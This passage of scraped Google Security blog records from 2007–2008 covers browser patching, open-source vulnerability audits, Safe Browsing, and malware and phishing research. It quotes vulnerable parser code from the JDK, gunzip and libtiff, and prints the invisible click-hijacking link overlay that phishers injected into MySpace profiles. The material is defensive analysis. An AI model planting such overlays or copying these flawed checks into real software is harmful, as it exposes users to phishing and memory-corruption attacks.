them to launch drive-by download attacks - security researchers from ETH Zurich, Google, and IBM Internet Security Systems were interested in looking at the other side of the attack: the web browser. By analyzing the web browser versions seen in visits to Google websites, they have shown that more than 600 million Internet users don't use the latest version of their browser.Slow migration to latest browser versionThe researchers' paper, entitled \"Understanding the Web Browser Threat\", shows that as of June 2008, only 59.1% percent of Internet users worldwide use the latest major version of their preferred web browser. Firefox users are the most attentive: 92.2% of them surfed with Firefox 2, the latest major version before the recently released 3.0. Only 52.5% of Microsoft Internet Explorer users have updated to version 7, which is the most secure according to multiple publicly-cited Microsoft experts (among them Sandi Hardmeier). The study revealed that 637 million Internet users worldwide who use web browsers are either not running the latest version of their preferred browser or have not installed the latest patches. These users are vulnerable to exploitation due to their web browser's \"built-in\" vulnerabilities and the lack of more recent security mechanisms such as improved phishing protection.Neglected security patchesOver the past 18 months, the study also shows, a maximum of 83.3% of Firefox users were using the latest major version of the web browser and also had all current patches installed (i.e. latest minor version). Only 56.1% and 47.6% of Opera and Internet Explorer users, respectively, were similarly utilizing fully-patched web browsers. Apple users are no better: since the public release of Safari 3, only 65.3% of users operate the latest Safari version.Maximum measured share of users surfing the web with the most secure versions of Firefox, Safari, Opera and Internet Explorer in June 2008 as seen on Google websites.Obsolete browser warningThe study's most important finding is that technical measures now in place do not sufficiently guarantee browser security, and that users' security awareness must be further developed. The problem is that most users are unaware that they are not using their browser's latest version. It must be made clear to web browser users that outdated software is associated with significantly higher risk. The researchers therefore suggest that, as a critical component of web software, a visible warning be instituted that warns the user of missing security patches in a way analogous to the 'best before' date in the perishable food industry. Software updates must also be made easier to find. The resulting transparency would go far in contributing to end user awareness of software weaknesses, and allow users to better evaluate risks.Example \"best before\" implementation on a Web browserAs a side effect, having users migrate faster to the latest browser version would not only increase security but also make the lives of webmasters easier, as they would need to test and optimize websites for fewer older versions of web browsers.     ", "date": "July 16, 2008"},
{"website": "Google-Security", "title": "\nAuditing open source software\n", "author": ["Written by Chris Evans, Security Team"], "link": "https://security.googleblog.com/2007/10/auditing-open-source-software.html", "abstract": "                             Written by Chris Evans, Security Team   Google encourages its employees to contribute back to the open source community, and there is no exception in Google's Security Team. Let's look at some interesting open source vulnerabilities that were located and fixed by members of Google's Security team. It is interesting to classify and aggregate the code flaws leading to the vulnerabilities, to see if any particular type of flaw is more prevalent.    JDK . In May 2007, I  released details  on an interesting bug in the ICC profile parser in Sun's JDK. The bug is particularly interesting because it could be exploited by an evil image. Most previous JDK bugs involve a user having to run a whole evil applet. The key parts of code which demonstrate the bug are as follows:    TagOffset = SpGetUInt32 (&Ptr); if (ProfileSize &lt TagOffset) &nbsp;&nbsp;return SpStatBadProfileDir; ... TagSize = SpGetUInt32 (&Ptr); if (ProfileSize &lt TagOffset + TagSize) &nbsp;&nbsp;return SpStatBadProfileDir; ... Ptr = (KpInt32_t *) malloc ((unsigned int)numBytes+HEADER);    Both TagSize and TagOffset are untrusted unsigned 32-bit values pulled out of images being parsed. They are added together, causing a classic integer overflow condition and the bypass of the size check. A subsequent additional integer overflow in the allocation of a buffer leads to a heap-based buffer overflow.     gunzip . In September 2006, my colleague Tavis Ormandy  reported some interesting vulnerabilities  in the gunzip decompressor. They were triggered when an evil compressed archive is decompressed. A lot of programs will automatically pass compressed data through gunzip, making it an interesting attack. The key parts of the code which demonstrate one of the bugs are as follows:    ush count[17], weight[17], start[18], *p; ... for (i = 0; i &lt (unsigned)nchar; i++) count[bitlen[i]]++;    Here, the stack-based array \"count\" is indexed by values in the \"bitlen\" array. These values are under the control of data in the incoming untrusted compressed data, and were not checked for being within the bounds of the \"count\" array. This led to corruption of data on the stack.     libtiff . In August 2006, Tavis  reported a range of security vulnerabilities  in the libtiff image parsing library. A lot of image manipulation programs and services will be using libtiff if they handle TIFF format files. So, an evil TIFF file could compromise a lot of desktops or even servers. The key parts of the code which demonstrate one of the bugs are as follows:    if (sp-&gt;cinfo.d.image_width != segment_width || &nbsp;&nbsp;&nbsp;&nbsp;sp-&gt;cinfo.d.image_height != segment_height) { &nbsp;&nbsp;TIFFWarningExt(tif-&gt;tif_clientdata, module, &nbsp;&nbsp;&nbsp;&nbsp;\"Improper JPEG strip/tile size, expected %dx%d, got %dx%d\",    Here, a TIFF file containing a JPEG image is being processed. In this case, both the TIFF header and the embedded JPEG image contain their own copies of the width and height of the image in pixels. This check above notices when these values differ, issues a warning, and continues. The destination buffer for the pixels is allocated based on the TIFF header values, and it is filled based on the JPEG values. This leads to a buffer overflow if a malicious image file contains a JPEG with larger dimensions than those in the TIFF header. Presumably the intent here was to support broken files where the embedded JPEG had smaller dimensions than those in the TIFF header. However, the consequences of larger dimensions that those in the TIFF header had not been considered.   We can draw some interesting conclusions from these bugs. The specific vulnerabilities are integer overflows, out-of-bounds array accesses and buffer overflows. However, the general theme is using an integer from an untrusted source without adequately sanity checking it. Integer abuse issues are still very common in code, particular code which is decoding untrusted binary data or protocols. We recommend being careful using any such code until it has been vetted for security (by extensive code auditing, fuzz testing, or preferably both). It is also important to watch for security updates for any decoding software you use, and keep patching up to date.                                   Written by Chris Evans, Security TeamGoogle encourages its employees to contribute back to the open source community, and there is no exception in Google's Security Team. Let's look at some interesting open source vulnerabilities that were located and fixed by members of Google's Security team. It is interesting to classify and aggregate the code flaws leading to the vulnerabilities, to see if any particular type of flaw is more prevalent.JDK. In May 2007, I released details on an interesting bug in the ICC profile parser in Sun's JDK. The bug is particularly interesting because it could be exploited by an evil image. Most previous JDK bugs involve a user having to run a whole evil applet. The key parts of code which demonstrate the bug are as follows:TagOffset = SpGetUInt32 (&Ptr);if (ProfileSize &lt TagOffset)  return SpStatBadProfileDir;...TagSize = SpGetUInt32 (&Ptr);if (ProfileSize &lt TagOffset + TagSize)  return SpStatBadProfileDir;...Ptr = (KpInt32_t *) malloc ((unsigned int)numBytes+HEADER);Both TagSize and TagOffset are untrusted unsigned 32-bit values pulled out of images being parsed. They are added together, causing a classic integer overflow condition and the bypass of the size check. A subsequent additional integer overflow in the allocation of a buffer leads to a heap-based buffer overflow. gunzip. In September 2006, my colleague Tavis Ormandy reported some interesting vulnerabilities in the gunzip decompressor. They were triggered when an evil compressed archive is decompressed. A lot of programs will automatically pass compressed data through gunzip, making it an interesting attack. The key parts of the code which demonstrate one of the bugs are as follows:ush count[17], weight[17], start[18], *p;...for (i = 0; i &lt (unsigned)nchar; i++) count[bitlen[i]]++;Here, the stack-based array \"count\" is indexed by values in the \"bitlen\" array. These values are under the control of data in the incoming untrusted compressed data, and were not checked for being within the bounds of the \"count\" array. This led to corruption of data on the stack.libtiff. In August 2006, Tavis reported a range of security vulnerabilities in the libtiff image parsing library. A lot of image manipulation programs and services will be using libtiff if they handle TIFF format files. So, an evil TIFF file could compromise a lot of desktops or even servers. The key parts of the code which demonstrate one of the bugs are as follows:if (sp->cinfo.d.image_width != segment_width ||    sp->cinfo.d.image_height != segment_height) {  TIFFWarningExt(tif->tif_clientdata, module,    \"Improper JPEG strip/tile size, expected %dx%d, got %dx%d\",Here, a TIFF file containing a JPEG image is being processed. In this case, both the TIFF header and the embedded JPEG image contain their own copies of the width and height of the image in pixels. This check above notices when these values differ, issues a warning, and continues. The destination buffer for the pixels is allocated based on the TIFF header values, and it is filled based on the JPEG values. This leads to a buffer overflow if a malicious image file contains a JPEG with larger dimensions than those in the TIFF header. Presumably the intent here was to support broken files where the embedded JPEG had smaller dimensions than those in the TIFF header. However, the consequences of larger dimensions that those in the TIFF header had not been considered.We can draw some interesting conclusions from these bugs. The specific vulnerabilities are integer overflows, out-of-bounds array accesses and buffer overflows. However, the general theme is using an integer from an untrusted source without adequately sanity checking it. Integer abuse issues are still very common in code, particular code which is decoding untrusted binary data or protocols. We recommend being careful using any such code until it has been vetted for security (by extensive code auditing, fuzz testing, or preferably both). It is also important to watch for security updates for any decoding software you use, and keep patching up to date.     ", "date": "October 8, 2007"},
{"website": "Google-Security", "title": "\nSafe Browsing Diagnostic To The Rescue\n", "author": ["Posted by Niels Provos"], "link": "https://security.googleblog.com/2008/05/safe-browsing-diagnostic-to-rescue.html", "abstract": "                             Posted by Niels Provos   We've been protecting Google users from malicious web pages since 2006 by showing warning labels in Google's search results and by publishing the data via the  Safe Browsing API  to client programs such as Firefox and Google Desktop Search. To create our data, we've built a large-scale infrastructure to automatically determine if web pages pose a risk to users. This system has proven to be highly accurate, but we've noted that it can sometimes be difficult for webmasters and users to verify our results, as attackers often use sophisticated obfuscation techniques or inject malicious payloads only under certain conditions. With that in mind, we've developed a Safe Browsing diagnostic page that will provide detailed information about our automatic investigations and findings.  The  Safe Browsing diagnostic page  of a site is structured into four different categories:     What is the current listing status for [the site in question]?   We display the current listing status of a site and also information on how often a site or parts of it were listed in the past.     What happened when Google visited this site?   This section includes information on when we analyzed the page, when it was last malicious, what kind of malware we encountered and so fourth.&nbsp;&nbsp; To help web masters clean up their site, we also provide information about the sites that were serving malicious software to users and which sites might have served as intermediaries.     Has this site acted as an intermediary resulting in further distribution of malware?   Here we provide information if this site has facilitated the distribution of malicious software in the past.  This could be an advertising network or statistics site that accidentally participated in the distribution of malicious software.    Has this site hosted malware?   Here we provide information if the the site has hosted malicious software in the past.  We also provide information on the victim sites that initiated the distribution of malicious software.    All information we show is historical over the last ninety days but does not go further into the past.&nbsp;&nbsp; Initially, we are making the Safe Browsing diagnostic page available in two ways.&nbsp; We are adding a link on the  interstitial  page a user sees after clicking on a search result with a warning label, and also via an \"additional information\" link in Firefox 3's warning page.  Of course, for anyone who wants to know more about how our detection system works, we also provide a detailed  tech report [pdf]  including an overview of the detection system and in-depth data analysis.                                    Posted by Niels ProvosWe've been protecting Google users from malicious web pages since 2006 by showing warning labels in Google's search results and by publishing the data via the Safe Browsing API to client programs such as Firefox and Google Desktop Search. To create our data, we've built a large-scale infrastructure to automatically determine if web pages pose a risk to users. This system has proven to be highly accurate, but we've noted that it can sometimes be difficult for webmasters and users to verify our results, as attackers often use sophisticated obfuscation techniques or inject malicious payloads only under certain conditions. With that in mind, we've developed a Safe Browsing diagnostic page that will provide detailed information about our automatic investigations and findings.The Safe Browsing diagnostic page of a site is structured into four different categories:What is the current listing status for [the site in question]?We display the current listing status of a site and also information on how often a site or parts of it were listed in the past.What happened when Google visited this site?This section includes information on when we analyzed the page, when it was last malicious, what kind of malware we encountered and so fourth.   To help web masters clean up their site, we also provide information about the sites that were serving malicious software to users and which sites might have served as intermediaries.Has this site acted as an intermediary resulting in further distribution of malware?Here we provide information if this site has facilitated the distribution of malicious software in the past.  This could be an advertising network or statistics site that accidentally participated in the distribution of malicious software.Has this site hosted malware?Here we provide information if the the site has hosted malicious software in the past.  We also provide information on the victim sites that initiated the distribution of malicious software.All information we show is historical over the last ninety days but does not go further into the past.   Initially, we are making the Safe Browsing diagnostic page available in two ways.  We are adding a link on the interstitial page a user sees after clicking on a search result with a warning label, and also via an \"additional information\" link in Firefox 3's warning page.  Of course, for anyone who wants to know more about how our detection system works, we also provide a detailed tech report [pdf] including an overview of the detection system and in-depth data analysis.     ", "date": "May 15, 2008"},
{"website": "Google-Security", "title": "\nContributing To Open Source Software Security\n", "author": ["Written by Will Drewry"], "link": "https://security.googleblog.com/2008/05/contributing-to-open-source-software.html", "abstract": "                             Written by Will Drewry   From  operating systems  to  web browsers , open source software plays a critical role in the operation of the Internet. The security of open source software is therefore quite important, as it often interacts with personal information -- ranging from credit card numbers to medical records -- that needs to be kept safe. There has been a long-lived discussion on whether open source software is inherently more secure than closed source software.  While popular opinion has begun to tilt in favor of openness, there are still arguments for both sides.  Instead of diving into those treacherous waters (or giving weight to the idea of \"inherent security\"), I'd like to focus on the fruits of this extensive discussion.  In particular, David A. Wheeler laid out a \"bottom line\" in his  Secure      Programming for Linux and Unix HOWTO  which applies to both open and closed source software. It predicates real security in software on three actions:     people need to actually review the code     developers/reviewers need to know how to write secure code      once found, security problems need to be fixed quickly, and their                                  fixes distributed quickly     While distilling anything down to three steps makes it seem easy, this isn't necessarily the case.  Given how important open source software is to Google, we've attempted to contribute to this bottom line.  As Chris  said before , our engineers are encouraged to contribute both software and time to open source efforts.  We  regularly submit  the results of our automated and manual security analysis of open source software back to the community, including related software engineering time. In addition, our engineering teams frequently release software under open source licenses. This software was written either with security in mind, such as with  security testing                                        tools , or by engineers well-versed in the  security        challenges  of their project.  These efforts leave one area completely unaddressed -- getting security problems fixed quickly, and then getting those fixes distributed quickly.  It has been unclear how to best resolve this issue.  There is no centralized security authority for open source projects, and operating system distribution publishers are the best bet for getting updates to the highest number of users.  Even if users can get updates in this manner, how should a security researcher contact a particular project's author?  If there's a potential, security-related issue, who can help evaluate the risk for a project?  What resources are there for projects that have been compromised, but have no operational security background?   I'm proud to announce that Google has sponsored participation in oCERT, the  open source computer emergency response team .  oCERT is a volunteer workforce of security professionals from the open source community with the goal of providing security vulnerability mediation and incident response services to open source projects.  It will strive to contact software authors with all security reports and aid in debugging and patching, especially in cases where the author, or the reporter, doesn't have a background in security.  Reliable contacts for projects, publishers, and vendors will be maintained where possible and used for notification when issues arise and fixes are available for mediated issues.  Additionally, oCERT will aid projects of any size with responses to security incidents, such as server compromises.   It is my hope that this initiative will not only aid in remediating security issues in a timely fashion, but also provide a means for additional security contributions to the open source community.                                   Written by Will DrewryFrom operating systems to web browsers, open source software plays a critical role in the operation of the Internet. The security of open source software is therefore quite important, as it often interacts with personal information -- ranging from credit card numbers to medical records -- that needs to be kept safe. There has been a long-lived discussion on whether open source software is inherently more secure than closed source software.  While popular opinion has begun to tilt in favor of openness, there are still arguments for both sides.  Instead of diving into those treacherous waters (or giving weight to the idea of \"inherent security\"), I'd like to focus on the fruits of this extensive discussion.  In particular, David A. Wheeler laid out a \"bottom line\" in his Secure      Programming for Linux and Unix HOWTO which applies to both open and closed source software. It predicates real security in software on three actions:people need to actually review the codedevelopers/reviewers need to know how to write secure codeonce found, security problems need to be fixed quickly, and their                                  fixes distributed quicklyWhile distilling anything down to three steps makes it seem easy, this isn't necessarily the case.  Given how important open source software is to Google, we've attempted to contribute to this bottom line.  As Chris said before, our engineers are encouraged to contribute both software and time to open source efforts.  We regularly submit the results of our automated and manual security analysis of open source software back to the community, including related software engineering time. In addition, our engineering teams frequently release software under open source licenses. This software was written either with security in mind, such as with security testing                                        tools, or by engineers well-versed in the security        challenges of their project.These efforts leave one area completely unaddressed -- getting security problems fixed quickly, and then getting those fixes distributed quickly.  It has been unclear how to best resolve this issue.  There is no centralized security authority for open source projects, and operating system distribution publishers are the best bet for getting updates to the highest number of users.  Even if users can get updates in this manner, how should a security researcher contact a particular project's author?  If there's a potential, security-related issue, who can help evaluate the risk for a project?  What resources are there for projects that have been compromised, but have no operational security background? I'm proud to announce that Google has sponsored participation in oCERT, the open source computer emergency response team.  oCERT is a volunteer workforce of security professionals from the open source community with the goal of providing security vulnerability mediation and incident response services to open source projects.  It will strive to contact software authors with all security reports and aid in debugging and patching, especially in cases where the author, or the reporter, doesn't have a background in security.  Reliable contacts for projects, publishers, and vendors will be maintained where possible and used for notification when issues arise and fixes are available for mediated issues.  Additionally, oCERT will aid projects of any size with responses to security incidents, such as server compromises. It is my hope that this initiative will not only aid in remediating security issues in a timely fashion, but also provide a means for additional security contributions to the open source community.     ", "date": "May 5, 2008"},
{"website": "Google-Security", "title": "\nThwarting a large-scale phishing attack\n", "author": ["Posted by Colin Whittaker, Anti-Phishing Team"], "link": "https://security.googleblog.com/2007/06/thwarting-large-scale-phishing-attack.html", "abstract": "                             Posted by Colin Whittaker, Anti-Phishing Team    In addition to targeting malware, we're interested in combating  phishing,  a social engineering attack where criminals attempt to lure unsuspecting web surfers into logging into a fake website that looks like a real website, such as eBay, E-gold or an online bank. Following a successful attack, phishers can steal money out of the victims' accounts or take their identities. To protect our users against phishing, we publish a blacklist of known phishing sites. This blacklist is the basis for the anti-phishing features in the latest versions of Firefox and Google Desktop. Although blacklists are necessarily a step behind as phishers move their phishing pages around, blacklists have proved to be reasonably effective.  Not all phishing attacks target sites with obvious financial value. Beginning in mid-March, we detected a five-fold increase in overall phishing page views. It turned out that the phishing pages generating 95% of the new phishing traffic targeted  MySpace , the popular social networking site. While a MySpace account does not have any intrinsic monetary value, phishers had come up with ways to monetize this attack. We observed hijacked accounts being used to spread bulletin board spam for some advertising revenue. According to  this interview with a phisher , phishers also logged in to the email accounts of the profile owners to harvest financial account information. In any case, phishing MySpace became profitable enough (more than phishing more traditional targets) that many of the active phishers began targeting it.  Interestingly, the attack vector for this new attack appeared to be MySpace itself, rather than the usual email spam. To observe the phishers' actions, we fed them the login information for a dummy MySpace account. We saw that when phishers compromised a MySpace account, they added links to their phishing page on the stolen profile, which would in turn result in additional users getting compromised. Using a quirk of the CSS supported in MySpace profiles, the phishers injected these links invisibly as see-through images covering compromised profiles. Clicking anywhere on an infected profile, including on links that appeared normal, redirected the user to a phishing page. Here's a sample of some CSS code injected into the \"About Me\" section of an affected profile:    &lt;a style=\"text-decoration:none;position: absolute;top:1px;left:1px;\" href=\"http://myspacev.net\"&gt;&lt;img style=\"border-width:0px;width:1200px; height:650px;\" src=\"http://x.myspace.com/images/clear.gif\"&gt;&lt;/a&gt;&lt;/style&gt;   In addition to contributing to the viral growth of the phishing attack, linking directly off of real MySpace content added to the appearance of legitimacy of these phishing pages. In fact, we received thousands of complaints from confused users along the lines of  \"  Why won't it let any of my friends look at my pictures?  \" regarding our warnings on these phishing pages, suggesting that even an explicit warning was not enough to protect many users. The effectiveness of the attack and the increasing sophistication of the phishing pages, some of which were hosted  on  botnets  and were near perfect duplications of MySpace's login page, meant that we needed to switch tactics to combat this new threat.  In late March, we reached out to MySpace to see what we could do to help. We provided lists of the top phishing sites and our anti-phishing blacklist to MySpace so that they could disable compromised accounts with links to those sites. Unfortunately, many of the blocked users did not remove the phishing links when they reactivated their accounts, so the attacks continued to spread. On April 19, MySpace updated their server software so that they could disable bad links in users' profiles without requiring any user action or altering any other profile content. Overnight, overall phishing traffic dropped by a factor of five back to the levels observed in early March. While MySpace phishing continues at much lower volumes, phishers are beginning to move on to new targets.   Things you can do to help end phishing and Internet fraud    Learn to recognize and avoid phishing. The Anti-Phishing Working Group has a good  list of recommendations .    Update your software regularly and run an anti-virus program. If a cyber-criminal gains control of your computer through a virus or a software security flaw, he doesn't need to resort to phishing to steal your information.    Use different passwords on different sites and change them periodically. Phishers routinely try to log in to high-value targets, like online banking sites, with the passwords they steal for lower-value sites, like webmail and social networking services.                                     Posted by Colin Whittaker, Anti-Phishing TeamIn addition to targeting malware, we're interested in combating phishing, a social engineering attack where criminals attempt to lure unsuspecting web surfers into logging into a fake website that looks like a real website, such as eBay, E-gold or an online bank. Following a successful attack, phishers can steal money out of the victims' accounts or take their identities. To protect our users against phishing, we publish a blacklist of known phishing sites. This blacklist is the basis for the anti-phishing features in the latest versions of Firefox and Google Desktop. Although blacklists are necessarily a step behind as phishers move their phishing pages around, blacklists have proved to be reasonably effective.Not all phishing attacks target sites with obvious financial value. Beginning in mid-March, we detected a five-fold increase in overall phishing page views. It turned out that the phishing pages generating 95% of the new phishing traffic targeted MySpace, the popular social networking site. While a MySpace account does not have any intrinsic monetary value, phishers had come up with ways to monetize this attack. We observed hijacked accounts being used to spread bulletin board spam for some advertising revenue. According to this interview with a phisher, phishers also logged in to the email accounts of the profile owners to harvest financial account information. In any case, phishing MySpace became profitable enough (more than phishing more traditional targets) that many of the active phishers began targeting it.Interestingly, the attack vector for this new attack appeared to be MySpace itself, rather than the usual email spam. To observe the phishers' actions, we fed them the login information for a dummy MySpace account. We saw that when phishers compromised a MySpace account, they added links to their phishing page on the stolen profile, which would in turn result in additional users getting compromised. Using a quirk of the CSS supported in MySpace profiles, the phishers injected these links invisibly as see-through images covering compromised profiles. Clicking anywhere on an infected profile, including on links that appeared normal, redirected the user to a phishing page. Here's a sample of some CSS code injected into the \"About Me\" section of an affected profile:    In addition to contributing to the viral growth of the phishing attack, linking directly off of real MySpace content added to the appearance of legitimacy of these phishing pages. In fact, we received thousands of complaints from confused users along the lines of \"Why won't it let any of my friends look at my pictures?\" regarding our warnings on these phishing pages, suggesting that even an explicit warning was not enough to protect many users. The effectiveness of the attack and the increasing sophistication of the phishing pages, some of which were hosted on botnets and were near perfect duplications of MySpace's login page, meant that we needed to switch tactics to combat this new threat.In late March, we reached out to MySpace to see what we could do to help. We provided lists of the top phishing sites and our anti-phishing blacklist to MySpace so that they could disable compromised accounts with links to those sites. Unfortunately, many of the blocked users did not remove the phishing links when they reactivated their accounts, so the attacks continued to spread. On April 19, MySpace updated their server software so that they could disable bad links in users' profiles without requiring any user action or altering any other profile content. Overnight, overall phishing traffic dropped by a factor of five back to the levels observed in early March. While MySpace phishing continues at much lower volumes, phishers are beginning to move on to new targets.Things you can do to help end phishing and Internet fraudLearn to recognize and avoid phishing. The Anti-Phishing Working Group has a good list of recommendations.Update your software regularly and run an anti-virus program. If a cyber-criminal gains control of your computer through a virus or a software security flaw, he doesn't need to resort to phishing to steal your information.Use different passwords on different sites and change them periodically. Phishers routinely try to log in to high-value targets, like online banking sites, with the passwords they steal for lower-value sites, like webmail and social networking services.     ", "date": "June 11, 2007"},
{"website": "Google-Security", "title": "\nAll Your ", "author": ["Written by Niels Provos, Anti-Malware Team"], "link": "https://security.googleblog.com/2008/02/all-your-iframe-are-point-to-us.html", "abstract": "                             Written by Niels Provos, Anti-Malware Team   It has been over a year and a half since we started to identify web pages that infect vulnerable hosts via  drive-by downloads , i.e. web pages that attempt to exploit their visitors by installing and running malware automatically.  During that time we have investigated billions of URLs and found more than three million unique URLs on over 180,000 web sites automatically installing malware.  During the course of our research, we have investigated not only the prevalence of drive-by downloads but also how users are being exposed to malware and how it is being distributed.   Our research paper is currently under peer review, but we are making a  technical report [PDF]  available now.  Although our technical report contains a lot more detail, we present some high-level findings here:   Search Results Containing a URL Labeled as Harmful       The above graph shows the percentage of daily queries that contain at least one search result labeled as harmful.  In the past few months, more than 1% of all search results contained at least one result that we believe to point to malicious content and the trend seems to be increasing.   Browsing Habits   Good computer hygiene, such as running automatic updates for the operating system and third-party applications, as well as installing anti-virus products goes a long way in protecting your home computer.  However, we have been wondering if  users' browsing habits impact the likelihood of encountering malicious web pages.   To study this aspect, we took a sample of ~7 million URLs and mapped them to  DMOZ  categories.  Although we found that adult web pages may increase the risk of exploitation, each DMOZ category was affected.   Malicious Content Injection   To understand if malicious content on a web server is due to poor web server security, we analyzed the version numbers reported by web servers on which we found malicious pages. Specifically, we looked at the Apache and the PHP versions exported as part of a server's response.   We found that over 38% of both Apache and PHP versions were outdated increasing the risk of remote content injection to these servers.  Our \" Ghost In the Browser [PDF] \" paper highlighted third-party content as one potential vector of malicious content.  Today, a lot of third-party content is due to advertising.  To assess the extent to which advertising contributes to drive-by downloads, we analyze the distribution chain of malware, i.e. all the intermediary URLs a browser downloads before reaching a malware payload.  We inspected each distribution chain for membership in about 2,000 known advertising networks.  If any URL in the distribution chain corresponds to a known advertising network, we count the whole page as being infectious due to Ads.  In our analysis, we found that on average 2% of malicious web sites were delivering malware via advertising.  The underlying problem is that advertising space is often syndicated to other parties who are not known to the web site owner.  Although non-syndicated advertising networks such as Google Adwords are not affected, any advertising networks practicing syndication needs to carefully study this problem. Our  technical report [PDF]  contains more detail including an analysis based on the popularity of web sites.   Structural Properties of Malware Distribution   Finally, we also investigated the structural properties of malware distribution sites.  Some malware distribution sites had as many as 21,000 regular web sites pointing to them.  We also found that the majority of malware was hosted on web servers located in China.  Interestingly, Chinese malware distribution sites are mostly pointed to by Chinese web servers.  We hope that an analysis such as this will help us to better understand the malware problem in the future and allow us to protect users all over the Internet from malicious web sites as best as we can.  One thing is clear - we have a lot of work ahead of us.                                   Written by Niels Provos, Anti-Malware TeamIt has been over a year and a half since we started to identify web pages that infect vulnerable hosts via drive-by downloads, i.e. web pages that attempt to exploit their visitors by installing and running malware automatically.  During that time we have investigated billions of URLs and found more than three million unique URLs on over 180,000 web sites automatically installing malware.  During the course of our research, we have investigated not only the prevalence of drive-by downloads but also how users are being exposed to malware and how it is being distributed.   Our research paper is currently under peer review, but we are making a technical report [PDF] available now.  Although our technical report contains a lot more detail, we present some high-level findings here:Search Results Containing a URL Labeled as HarmfulThe above graph shows the percentage of daily queries that contain at least one search result labeled as harmful.  In the past few months, more than 1% of all search results contained at least one result that we believe to point to malicious content and the trend seems to be increasing.Browsing HabitsGood computer hygiene, such as running automatic updates for the operating system and third-party applications, as well as installing anti-virus products goes a long way in protecting your home computer.  However, we have been wondering if  users' browsing habits impact the likelihood of encountering malicious web pages.   To study this aspect, we took a sample of ~7 million URLs and mapped them to DMOZ categories.  Although we found that adult web pages may increase the risk of exploitation, each DMOZ category was affected.Malicious Content InjectionTo understand if malicious content on a web server is due to poor web server security, we analyzed the version numbers reported by web servers on which we found malicious pages. Specifically, we looked at the Apache and the PHP versions exported as part of a server's response.   We found that over 38% of both Apache and PHP versions were outdated increasing the risk of remote content injection to these servers.Our \"Ghost In the Browser [PDF]\" paper highlighted third-party content as one potential vector of malicious content.  Today, a lot of third-party content is due to advertising.  To assess the extent to which advertising contributes to drive-by downloads, we analyze the distribution chain of malware, i.e. all the intermediary URLs a browser downloads before reaching a malware payload.  We inspected each distribution chain for membership in about 2,000 known advertising networks.  If any URL in the distribution chain corresponds to a known advertising network, we count the whole page as being infectious due to Ads.  In our analysis, we found that on average 2% of malicious web sites were delivering malware via advertising.  The underlying problem is that advertising space is often syndicated to other parties who are not known to the web site owner.  Although non-syndicated advertising networks such as Google Adwords are not affected, any advertising networks practicing syndication needs to carefully study this problem. Our technical report [PDF] contains more detail including an analysis based on the popularity of web sites.Structural Properties of Malware DistributionFinally, we also investigated the structural properties of malware distribution sites.  Some malware distribution sites had as many as 21,000 regular web sites pointing to them.  We also found that the majority of malware was hosted on web servers located in China.  Interestingly, Chinese malware distribution sites are mostly pointed to by Chinese web servers.We hope that an analysis such as this will help us to better understand the malware problem in the future and allow us to protect users all over the Internet from malicious web sites as best as we can.  One thing is clear - we have a lot of work ahead of us.     ", "date": "February 11, 2008"},
{"website": "Google-Security", "title": "\nHelp us fill in the gaps!\n", "author": ["Posted by Ian Fette"], "link": "https://security.googleblog.com/2007/11/help-us-fill-in-gaps.html", "abstract": "                             Posted by Ian Fette    We've been targeting malware  for over a year and a half , and these efforts are paying off. We are now able to display warnings in search results when a site is known to be malicious, which can help you avoid drive-by downloads and other computer compromises. We are already distributing this data through the  Safe Browsing API , and we are working on bringing this protection to more users by integrating with more Google products. While these are great steps, we need your help going forward!      Currently, we know of hundreds of thousands of websites that attempt to infect people's computers with malware. Unfortunately, we also know that there are more malware sites out there. This is where we need your help in filling in the gaps. If you come across a site that is hosting malware, we now have an easy way for you to let us know about it. If you come across a site that is hosting malware, please fill out  this short form . Help us keep the internet safe, and report sites that distribute malware.                                        Posted by Ian FetteWe've been targeting malware for over a year and a half, and these efforts are paying off. We are now able to display warnings in search results when a site is known to be malicious, which can help you avoid drive-by downloads and other computer compromises. We are already distributing this data through the Safe Browsing API, and we are working on bringing this protection to more users by integrating with more Google products. While these are great steps, we need your help going forward! Currently, we know of hundreds of thousands of websites that attempt to infect people's computers with malware. Unfortunately, we also know that there are more malware sites out there. This is where we need your help in filling in the gaps. If you come across a site that is hosting malware, we now have an easy way for you to let us know about it. If you come across a site that is hosting malware, please fill out this short form. Help us keep the internet safe, and report sites that distribute malware.       ", "date": "November 29, 2007"},
{"website": "Google-Security", "title": "\nPhishers and Malware authors beware!\n", "author": ["Posted by Brian Rakowski and Garrett Casto, Anti-Phishing and Anti-Malware Teams"], "link": "https://security.googleblog.com/2007/06/phishers-and-malware-authors-beware.html", "abstract": "                             Posted by Brian Rakowski and Garrett Casto, Anti-Phishing and Anti-Malware Teams   OK, so it might be a little early to declare victory, but we're excited about the  Safe Browsing API  we launched today. It provides a simple mechanism for downloading Google's lists of suspected phishing and malware URLs, so now any developer can access the blacklists used in products such as Firefox and Google Desktop.  The API is still experimental, but we hope it will be useful to ISPs, web-hosting companies, and anyone building a site or an application that publishes or transmits user-generated links.  Sign up for a key  and let us know how we can make the API better. We fully expect to iterate on the design and improve the data behind the API, and we'll be paying close attention to your  feedback   as we do that. We  look forward to hearing your thoughts.                                      Posted by Brian Rakowski and Garrett Casto, Anti-Phishing and Anti-Malware TeamsOK, so it might be a little early to declare victory, but we're excited about the Safe Browsing API we launched today. It provides a simple mechanism for downloading Google's lists of suspected phishing and malware URLs, so now any developer can access the blacklists used in products such as Firefox and Google Desktop.The API is still experimental, but we hope it will be useful to ISPs, web-hosting companies, and anyone building a site or an application that publishes or transmits user-generated links. Sign up for a key and let us know how we can make the API better. We fully expect to iterate on the design and improve the data behind the API, and we'll be paying close attention to your feedback as we do that. We  look forward to hearing your thoughts.     ", "date": "June 18, 2007"},
{"website": "Google-Security", "title": "\nMeet ratproxy, our passive web security assessment tool\n", "author": ["Posted by Michal Zalewski"], "link": "https://security.googleblog.com/2008/07/meet-ratproxy-our-passive-web-security.html", "abstract": "                             Posted by Michal Zalewski   We're happy to announce that we've just open-sourced  ratproxy , a passive web application security assessment tool that we've been using internally at Google. This utility, developed by our information security engineering team, is designed to transparently analyze legitimate, browser-driven interactions with a tested web property and automatically pinpoint, annotate, and prioritize potential flaws or areas of concern.    The proxy analyzes problems such as cross-site script inclusion threats, insufficient cross-site request forgery defenses, caching issues, cross-site scripting candidates, potentially unsafe cross-domain code inclusion schemes and information leakage scenarios, and much more. (A more-detailed discussion of these features and information on securing vulnerable applications is provided  here .) Compared with more-traditional active crawlers, or with fully manual request inspection and modification frameworks, this approach offers several significant advantages in terms of minimized overhead; marginalized risk of site disruptions; high coverage of complex, client-driven application states in web 2.0 solutions; and insight into dynamic cross-domain trust models.  We decided to make this tool freely available as open source because we feel it will be a valuable contribution to the information security 